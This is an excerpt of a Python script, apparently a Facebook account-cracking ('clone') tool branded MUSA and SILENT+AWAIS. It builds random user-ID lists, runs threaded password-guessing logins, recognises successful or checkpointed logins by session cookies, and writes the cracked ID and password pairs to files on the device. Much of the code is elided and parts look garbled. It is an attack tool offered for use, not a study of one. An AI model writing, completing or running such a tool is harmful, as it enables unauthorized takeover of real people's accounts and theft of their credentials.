...
try:
	...
	os.system('python SILENT+AWAIS.py')
ugen = []
...
try:
	...
	print('\x1b[1;95m[√] NOT WORKING PLEASE WAIT FOR UPDATE...')
	os.system('clear')
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> MUSA  VERSION :\x1b[1;92m 1.1 ')
			linex()
			print('[1]  File Clone\n[2] PAK Random Clone\n[0] Exit')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/SILENT+AWAIS.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[MUSA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SILENT+AWAIS:
				print('\r\r\033[1;31m[MUSA-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/SILENT+AWAIS-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SILENT+AWAIS:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[MUSA-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SILENT+AWAIS-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[MUSA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SILENT+AWAIS:
				...
				print('\r\r\033[1;32m[MUSA-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[MUSA-OK] '+ids+' | '+pas+'\033[1;97m')
...
def menu():
	os.system('clear')
	print(logo)
	print('[1] AUTO PASS Method 1')
	print('[2] Best Auto Method 2')
	print('[3] Khan name pass Method 3')
	linex()
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	limit = int(input('[+] 3000 5000 9000  ? '))
...
def random_number2():
	...
	os.system('clear')
	print(logo)
	limit = int(input('[+]2000 4000 6000 9999 ETC.. ? '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as yaari:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mMUSA\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[MUSA-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[MUSA-OK] '+cid+' | '+ps+'\33[0;97m')
